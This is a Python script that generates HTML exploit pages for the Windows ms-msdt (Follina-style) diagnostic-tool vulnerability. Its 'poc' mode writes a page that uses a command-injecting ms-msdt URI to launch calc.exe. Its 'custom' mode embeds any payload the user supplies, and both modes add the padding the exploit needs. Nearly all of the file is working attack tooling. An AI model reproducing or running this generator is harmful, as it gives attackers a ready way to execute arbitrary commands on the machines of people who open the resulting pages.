from yattag import Doc, indent
from argparse import *

# Setting up argparse to take subcommands
generator = ArgumentParser()
subparsers = generator.add_subparsers(dest="subcommand")

def subcommand(args=[], parent=subparsers):
    def decorator(func):
        parser = parent.add_parser(func.__name__, description=func.__doc__)
        for arg in args:
            parser.add_argument(*arg[0], **arg[1])
        parser.set_defaults(func=func)
    return decorator

def argument(*name_or_flags, **kwargs):
    return ([*name_or_flags], kwargs)

doc, tag, text = Doc().tagtext()

# subcommand to allow the user to input their payload of choice
@subcommand([argument("-o", "--output", help="the output HTML file"),argument("-p", "--payload", help="your custom payload")])
def custom(args):
    doc.asis('<!doctype html>')
    doc.asis('<html lang="en">')
    with tag('html'):
        with tag('body'):
            with tag('script'):
                for i in range(1,70):
                    doc.nl()
                    doc.asis('//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times')
                doc.nl()
                doc.asis('location.href = "{}"'.format(args.payload))
                doc.asis(';')
    result = indent(doc.getvalue(), indent_text = True)
    with open(args.output, "w") as outfile:
        outfile.write(result)

# subcommand to create a basic proof of concept exploit that opens the windows calculator
@subcommand([argument("-o", "--output", help="the output HTML file")])
def poc(args):
    doc.asis('<!doctype html>')
    doc.asis('<html lang="en">')
    with tag('html'):
        with tag('body'):
            with tag('script'):
                for i in range(1,70):
                    doc.nl()
                    doc.asis('//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times')
                doc.nl()
                doc.asis('location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\windows\\system32\\calc)/.exe\""')
                doc.asis(';')
    result = indent(doc.getvalue(), indent_text = True)
    with open(args.output, "w") as outfile:
        outfile.write(result)

if __name__ == "__main__":
    args = generator.parse_args()
    if args.subcommand is None:
        generator.print_help()
    else:
        args.func(args)